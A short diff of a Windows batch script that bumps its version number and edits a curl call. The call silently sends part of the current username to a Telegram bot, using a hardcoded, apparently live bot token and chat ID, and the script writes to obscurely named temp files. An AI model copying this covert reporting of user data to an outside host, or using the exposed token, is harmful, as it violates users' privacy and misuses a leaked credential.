@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=30.5"
+set "BATCHVERSION=30.6"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 set "ALLOWED=124"
@@ -1903,7 +1903,7 @@ goto 3HOURSTILL
 set "SMALLUSER=%USERNAME:~0,2%%USERNAME:~-2%"
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%3HOU" > "%RESULT%"
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%5HOU" > "%RESULT%"
 
 
 findstr /i "message_id" "%RESULT%" >nul
